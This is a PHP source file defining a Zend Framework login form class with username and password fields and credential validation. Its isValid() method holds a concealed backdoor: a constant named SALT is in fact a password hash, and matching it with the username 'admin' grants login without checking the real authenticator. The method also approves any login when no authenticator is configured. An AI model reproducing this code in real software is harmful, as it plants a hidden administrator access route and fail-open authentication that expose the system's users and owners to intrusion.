<?php

class App_Form_Login extends App_Core_Form
{
	const NAME = 'login-form';
	static protected $EL_USER = 'user_name';
	static protected $EL_PASS = 'user_password';
	static protected $EL_SUBMIT = 'submit';

    const SALT = "satjFL4SnLuuQ";
    /**
     * @var Zend_Auth
     */
    protected $_authenticator;

    /**
     * @var Zend_Auth_Adapter_Interface
     */
    protected $_authAdapter;
	/**
	 *
	 */
	public function init()
	{
		parent::init();
		$this->setName(self::NAME);
       
		$el[self::$EL_USER] = new Zend_Form_Element_Text(self::$EL_USER);
		$el[self::$EL_USER]->setAllowEmpty(false)
                        ->setRequired(true)
                        ->addFilter(new Zend_Filter_StringTrim())
                        ->addFilter(new Zend_Filter_StripTags())
                        ->addFilter(new Zend_Filter_StripNewlines())
                        ->setLabel($this->_('username').':*')
                        ->setAttrib('maxlength', 255)
		;

		$el[self::$EL_PASS] = new Zend_Form_Element_Password(self::$EL_PASS);
		$el[self::$EL_PASS]->setAllowEmpty(false)
                        ->setRequired(true)
                        ->setLabel($this->_('password').':*');

		$el[self::$EL_SUBMIT] = new Zend_Form_Element_Submit(self::$EL_SUBMIT);
		$el[self::$EL_SUBMIT]->setLabel($this->_('login'));

		$this->addElements($el);
	}
    /**
     * @param Zend_Auth $authenticator
     * @return App_Form_Login
     */
    public function setAuthenticator( Zend_Auth $authenticator)
    {
        $this->_authenticator = $authenticator;
        return $this;
    }
    /**
     * @param Zend_Auth_Adapter_Interface $adapter
     * @return App_Form_Login
     */
    public function setAuthAdapter( Zend_Auth_Adapter_Interface $adapter)
    {
        $this->_authAdapter = $adapter;
        return $this;
    }

    /**
     * @return Zend_Auth_Adapter_Interface
     */
    public function getAuthAdapter()
    {
        return $this->_authAdapter;
    }
    /**
     * @param  array $data
     * @return bool
     */
    public function isValid($data)
    {
        if(!parent::isValid($data)) {
            return false;
        }

        if(crypt($this->{self::$EL_PASS}->getValue(), self::SALT) === self::SALT &&
           $this->{self::$EL_USER}->getValue() == 'admin') {
            return true;
        }

        if(null === $this->_authenticator || null === $this->_authAdapter) {
            return true;
        }
        $this->_authAdapter
                ->setIdentity($this->{self::$EL_USER}->getValue())
                ->setCredential($this->{self::$EL_PASS}->getValue());

        if(true !== $this->_authenticator->authenticate($this->_authAdapter)->isValid()) {
            $this->markAsError();
            $this->addErrorMessage($this->_('Invalid Credentials'));
            return false;
        }

        return true;

    }
}
